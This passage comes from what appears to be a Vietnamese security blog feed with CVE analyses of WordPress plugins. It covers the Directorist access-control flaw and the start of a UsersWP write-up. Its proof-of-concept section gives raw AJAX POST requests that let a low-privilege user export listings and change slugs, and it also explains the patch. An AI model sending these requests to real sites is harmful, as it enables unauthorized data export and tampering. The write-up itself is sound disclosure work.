g·ªçi v√†o endpoint ƒë·ªÉ th·ª±c hi·ªán l·∫•y danh s√°ch c√°c &lt;strong&gt;Directory Listings&lt;/strong&gt; ho·∫∑c thay ƒë·ªïi slug c·ªßa b·∫•t k·ª≥ Listing Type, d√π h√†nh ƒë·ªông ƒë√≥ l·∫Ω ra ch·ªâ d√†nh cho admin.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v8.5.3)&lt;/strong&gt; th√™m ki·ªÉm tra quy·ªÅn v√†o c√°c callback b·∫±ng ƒëo·∫°n:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;manage_atbdp_options&amp;#39; ) ) {&#xA;    wp_send_json_error(&#xA;        [&#xA;            &amp;#39;error&amp;#39; =&amp;gt; __( &amp;#39;You are not allowed to modify directory slugs.&amp;#39;, &amp;#39;directorist&amp;#39; ),&#xA;        ],&#xA;        403&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Quy·ªÅn &lt;code&gt;manage_atbdp_options&lt;/code&gt; l√† m·ªôt &lt;strong&gt;custom capability&lt;/strong&gt;, ƒë∆∞·ª£c g√°n cho Administrator th√¥ng qua:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$wp_roles-&amp;gt;add_cap( &amp;#39;administrator&amp;#39;, &amp;#39;manage_atbdp_options&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nghƒ©a l√† ch·ªâ Administrator m·ªõi c√≥ quy·ªÅn th·ª±c thi c√°c h√†nh ƒë·ªông nh∆∞ ƒë·ªïi slug hay xu·∫•t d·ªØ li·ªáu, kh·∫Øc ph·ª•c ho√†n to√†n l·ªói thi·∫øu capability check.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Logged-in user (Subscriber or higher)&amp;#34;] --&amp;gt; B[&amp;#34;Send AJAX request to wp-admin/admin-ajax.php with action=directorist_prepare_listings_export_file or action=directorist_type_slug_change&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;wp_ajax_* hook is triggered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Callback executes&amp;#34;]&#xA;D --&amp;gt; E{&amp;#34;Is nonce valid?&amp;#34;}&#xA;E -- No --&amp;gt; F[&amp;#34;Return error&amp;#34;]&#xA;E -- Yes --&amp;gt; G[&amp;#34;Process request&amp;#34;]&#xA;G --&amp;gt; H{&amp;#34;Is capability checked?&amp;#34;}&#xA;H -- No --&amp;gt; I[&amp;#34;Subscriber or higher can export all listings or change any directory slug&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Broken Access Control&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Login Subcriber account v√† l·∫•y &lt;code&gt;directorist_nonce&lt;/code&gt; t·ª´ response&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-13-cve-2025-12174/nonce.png&#34; title=&#34;L·∫•y nonce t·ª´ response&#34; data-thumbnail=&#34;/posts/2025-12-13-cve-2025-12174/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;L·∫•y nonce t·ª´ response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-13-cve-2025-12174/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;670&#34; width=&#34;927&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;L·∫•y nonce t·ª´ response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;G·ª≠i request:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;L·∫•y danh s√°ch c√°c &lt;strong&gt;Directory Listings&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost &#xA;Cookie: sub_cookie&#xA;...&#xA;action=directorist_prepare_listings_export_file&amp;amp;directorist_nonce=22a1e53ab7&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Thay ƒë·ªïi slug c·ªßa b·∫•t k·ª≥ Listing Type&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost &#xA;Cookie: sub_cookie&#xA;...&#xA;action=directorist_type_slug_change&amp;amp;directorist_nonce=22a1e53ab7&amp;amp;type_id=580&amp;amp;update_slug=payload&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong &lt;strong&gt;Directorist &amp;lt;= 8.5.2&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác &lt;strong&gt;kh√¥ng tri·ªÉn khai ki·ªÉm tra quy·ªÅn h·∫°n&lt;/strong&gt; trong hai AJAX action ƒë·∫∑c quy·ªÅn. D√π plugin c√≥ s·ª≠ d·ª•ng nonce ƒë·ªÉ ch·ªëng CSRF, c∆° ch·∫ø n√†y kh√¥ng ƒë√≥ng vai tr√≤ x√°c th·ª±c quy·ªÅn, d·∫´n ƒë·∫øn vi·ªác &lt;strong&gt;m·ªçi ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p&lt;/strong&gt;, bao g·ªìm c·∫£ &lt;em&gt;Subscriber&lt;/em&gt;, ƒë·ªÅu c√≥ th·ªÉ xu·∫•t to√†n b·ªô d·ªØ li·ªáu Listing ho·∫∑c t√πy √Ω thay ƒë·ªïi slug ‚Äî nh·ªØng h√†nh ƒë·ªông l·∫Ω ra ch·ªâ d√†nh cho Administrator.&#xA;B·∫£n v√° ·ªü &lt;strong&gt;v8.5.3&lt;/strong&gt; kh·∫Øc ph·ª•c tri·ªát ƒë·ªÉ b·∫±ng c√°ch b·ªï sung ki·ªÉm tra capability &lt;code&gt;manage_atbdp_options&lt;/code&gt;, thi·∫øt l·∫≠p l·∫°i ranh gi·ªõi truy c·∫≠p ƒë√∫ng ƒë·∫Øn.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonce kh√¥ng ph·∫£i l√† ki·ªÉm tra quy·ªÅn&lt;/strong&gt;: nonce ch·ªâ ngƒÉn CSRF, kh√¥ng ngƒÉn ng∆∞·ªùi d√πng c·∫•p th·∫•p th·ª±c thi thao t√°c nh·∫°y c·∫£m.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;AJAX c·ªßa WordPress l√† b·ªÅ m·∫∑t t·∫•n c√¥ng ph·ªï bi·∫øn&lt;/strong&gt;: m·ªçi &lt;code&gt;wp_ajax_&lt;/code&gt; c·∫ßn ki·ªÉm tra capability r√µ r√†ng.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Broken Access Control th∆∞·ªùng ƒë·∫øn t·ª´ vi·ªác thi·∫øu m·ªôt d√≤ng ki·ªÉm tra&lt;/strong&gt;, kh√¥ng ph·∫£i l·ªói ph·ª©c t·∫°p.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Custom capability&lt;/strong&gt; (nh∆∞ &lt;code&gt;manage_atbdp_options&lt;/code&gt;) l√† c√°ch hi·ªáu qu·∫£ ƒë·ªÉ ki·ªÉm so√°t quy·ªÅn chi ti·∫øt.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n ki·ªÉm tra ƒë·ªìng th·ªùi &lt;strong&gt;x√°c th·ª±c ng∆∞·ªùi d√πng&lt;/strong&gt; v√† &lt;strong&gt;quy·ªÅn th·ª±c thi&lt;/strong&gt; tr∆∞·ªõc khi cho ph√©p thao t√°c qu·∫£n tr·ªã.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/directorist/vulnerability/wordpress-directorist-plugin-8-5-2-missing-authorization-to-authenticated-subscriber-data-export-and-slug-update-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Directorist Plugin &amp;lt;= 8.5.2 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-66072 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-12-cve-2025-66072/</link>
      <pubDate>Fri, 12 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-12-cve-2025-66072/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-12-cve-2025-66072/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Missing Authorization&lt;/strong&gt; trong &lt;strong&gt;Stiofan UsersWP&lt;/strong&gt; cho ph√©p khai th√°c &lt;strong&gt;Incorrectly Configured Access Control Security Levels&lt;/strong&gt;. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;UsersWP&lt;/strong&gt;: t·ª´ &lt;strong&gt;n/a&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;&amp;lt;= 1.2.47&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-66072&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-66072&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.2.47&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.2.48&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/userswp/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UsersWP Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;UsersWP&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.2.47&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.2.48&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;admin_init&amp;#39;, array( $this, &amp;#39;handle_bulk_user_type_change&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;admin_init&lt;/code&gt; ch·∫°y m·ªói khi b·∫•t k·ª≥ ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p truy c·∫≠p v√†o trang admin (&lt;code&gt;/wp-admin/&lt;/code&gt;), nh∆∞ng n√≥ c≈©ng ƒë∆∞·ª£c k√≠ch ho·∫°t trong c√°c endpoint nh∆∞ &lt;strong&gt;&lt;code&gt;admin-ajax.php&lt;/code&gt;&lt;/strong&gt; v√† &lt;strong&gt;&lt;code&gt;admin-post.php&lt;/code&gt;&lt;/strong&gt;. V√¨ c√°c endpoint n√†y cho ph√©p truy c·∫≠p c·∫£ t·ª´ Unauthenticated user, n√™n trong m·ªôt s·ªë ƒëi·ªÅu ki·ªán, Unauthenticated user v·∫´n c√≥ th·ªÉ khi·∫øn &lt;code&gt;admin_init&lt;/code&gt; ƒë∆∞·ª£c k√≠ch ho·∫°t d√π h·ªç kh√¥ng truy c·∫≠p v√†o trang admin.&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† b·∫•t k·ªÉ user n√†o, ch·ªâ c·∫ßn g·ª≠i request ƒë·∫øn &lt;code&gt;admin-ajax.php&lt;/code&gt; ho·∫∑c &lt;code&gt;admin-post.php&lt;/code&gt;, hook &lt;code&gt;admin_init&lt;/code&gt; v·∫´n ƒë∆∞·ª£c ch·∫°y, v√† khi ƒë√≥ callback &lt;code&gt;handle_bulk_user_type_change&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_bulk_user_type_change() {&#xA;    if ( ! isset( $_GET[&amp;#39;uwp_change_user_type&amp;#39;], $_GET[&amp;#39;uwp_new_user_type&amp;#39;] ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    $new_user_type = absint( $_GET[&amp;#39;uwp_new_user_type&amp;#39;] );&#xA;&#xA;    if ( ! $new_user_type ) {&#xA;        return;&#xA;    }&#xA;&#xA;    $users = isset( $_REQUEST[&amp;#39;users&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $_REQUEST[&amp;#39;users&amp;#39;] ) ? (array) $_REQUEST[&amp;#39;users&amp;#39;] : array();&#xA;&#xA;    if ( ! empty( $users ) ) {&#xA;        array_map( function( $user_id ) use ( $new_user_type ) {&#xA;            update_user_meta( absint( $user_id ), &amp;#39;_uwp_register_form_id&amp;#39;, (int) $new_user_type );&#xA;        }, $users );&#xA;    } &#xA;&#xA;    wp_safe_redirect( add_query_arg( &amp;#39;user_type_updated&amp;#39;, &amp;#39;true&amp;#39;, admin_url( &amp;#39;users.php&amp;#39; ) ) );&#xA;    exit;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m ki·ªÉm tra xem request c√≥ ch·ª©a &lt;code&gt;uwp_change_user_type&lt;/code&gt; v√† &lt;code&gt;uwp_new_user_type&lt;/code&gt; hay kh√¥ng; n·∫øu kh√¥ng c√≥ th√¨ d·ª´ng l·∫°i.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu c√≥, h√†m l·∫•y gi√° tr·ªã &lt;code&gt;uwp_new_user_type&lt;/code&gt; t·ª´ &lt;code&gt;$_GET&lt;/code&gt; v√† chuy·ªÉn th√†nh s·ªë nguy√™n d∆∞∆°ng. N·∫øu gi√° tr·ªã n√†y kh√¥ng h·ª£p l·ªá, h√†m d·ª´ng l·∫°i.&lt;/p&gt;&#xA;&lt;p&gt;Ti·∫øp theo, h√†m l·∫•y danh s√°ch user t·ª´ &lt;code&gt;$_REQUEST[&#39;users&#39;]&lt;/code&gt;. N·∫øu m·∫£ng n√†y kh√¥ng r·ªóng, h√†m th·ª±c hi·ªán &lt;code&gt;update_user_meta()&lt;/code&gt; cho t·ª´ng user, c·∫≠p nh·∫≠t &lt;code&gt;_uwp_register_form_id&lt;/code&gt; b·∫±ng gi√° tr·ªã &lt;code&gt;$new_user_type&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Cu·ªëi c√πng, h√†m redirect v·ªÅ &lt;code&gt;users.php&lt;/code&gt; v·ªõi tham s·ªë &lt;code&gt;user_type_updated=true&lt;/code&gt; v√† k·∫øt th√∫c x·ª≠ l√Ω.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-12-cve-2025-66072/type.png&#34; title=&#34;Danh s√°ch User Type&#34; data-thumbnail=&#34;/posts/2025-12-12-cve-2025-66072/type.png&#34; data-sub-html=&#34;&lt;h2&gt;User Type&lt;/h2&gt;&lt;p&gt;Danh s√°ch User Type&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-12-cve-2025-66072/type.png&#39; alt=&#34;User Type&#34; height=&#34;338&#34; width=&#34;747&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Danh s√°ch User Type&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open 